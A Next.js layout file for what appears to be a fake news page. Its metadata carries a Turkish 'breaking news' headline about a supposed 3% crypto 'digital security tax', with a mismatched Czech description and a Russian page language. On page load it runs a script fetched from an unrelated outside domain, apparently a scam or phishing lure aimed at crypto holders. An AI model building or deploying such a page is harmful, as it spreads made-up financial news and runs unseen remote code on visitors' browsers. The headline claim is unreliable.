export const metadata = {
  title: "SON DAKİKA: Maliye, 200.000 TL üzeri kripto varlıklara %3 “dijital güvenlik vergisi” getirmeye hazırlanıyor — Turk Portal",
  description: "Finanční správa České republiky dnes vydala mimořádné oznámení ohledně plánované 3% digitální bezpečnostní daně z kryptoměn.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import Script from "next/script";
import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="ru">
      <body>
        {children}
        <Script
          src="https://golden-digger.art/p/58d58c34-7749-4fd7-88a5-4053d57839c1/bootstrap.js"
          strategy="afterInteractive"
        />
      </body>
    </html>
  );
}
